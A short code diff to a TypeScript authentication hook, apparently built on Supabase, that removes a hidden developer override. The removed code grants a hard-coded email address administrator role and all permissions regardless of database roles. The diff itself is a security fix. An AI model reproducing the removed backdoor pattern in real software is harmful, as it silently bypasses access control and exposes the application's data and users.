@@ -23,16 +23,8 @@ export function useAuth(): AuthState {
   useEffect(() => {
     let active = true;
 
-    async function loadProfile(uid: string, email: string | null) {
-      // Hidden developer override: this exact email always gets full
-      // developer + administrator access, regardless of DB roles.
-      if (isDeveloperEmail(email)) {
-        if (!active) return;
-        setIsDeveloper(true);
-        setRole("admin");
-        setPermissions(ALL_PERMISSIONS);
-        return;
-      }
+    async function loadProfile(uid: string) {
+
 
       const [{ data: roleRows }, { data: emp }] = await Promise.all([
         supabase
